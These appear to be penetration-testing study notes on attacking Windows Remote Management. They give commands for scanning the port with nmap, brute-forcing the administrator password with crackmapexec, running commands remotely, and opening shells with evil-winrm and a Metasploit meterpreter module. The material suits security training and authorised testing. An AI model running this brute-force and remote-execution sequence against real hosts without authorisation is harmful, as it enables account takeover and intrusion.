 
### Using `nmap` to identify WinRM

```
nmap -sV -p 5985 <target-ip> 
```

- Ignore the banner/service version displayed by `nmap` as Windows systems don't explicitly have a banner for WinRM. 
- We can verify that the port is running WinRM by using `crackmapexec`.

### Bruteforcing `WinRM` using `crackmapexec`

```
crackmapexec winrm <target-ip> -u <username> -p <pass-file> 
```

- It'll use the `wsman` (Windows Management) service, as `winrm` is the implementation of `wsman` API. 

- Reason to attack `administrator` account:
	+ In a Windows system, the `administrator` account is definitely available as it is the first account that's created when installing Windows.
	+ The `administrator` account will be the user account used by system admins for obvious reasons. 
	+ If we gain access to the `administrator` account, we will have elevated privileges and we won't have to go through the process of elevating our privileges manually.

*Now that we've the credentials, we can use `crackmapexec` to execute arbitrary commands on the target.*

### Using `crackmapexec` to execute arbitrary commands

```
crackmapexec winrm <target-ip> -u <username> -p <password> -x "<command>"
```

- Executing commands will have its own logs on the target system.

### Using `evil-winrm` to gain command shell session

*This is a Ruby script. Use `.rb` extension to use the tool.*

```
evil-winrm.rb -u <username> -p '<password>' -i <target-ip> 
```

### Using `MSF` to get `meterpreter` session

```
use exploit/windows/winrm/winrm_script_exec
```

- Set `FORCE_VBS` to `true`
- Set the `username` & `password`

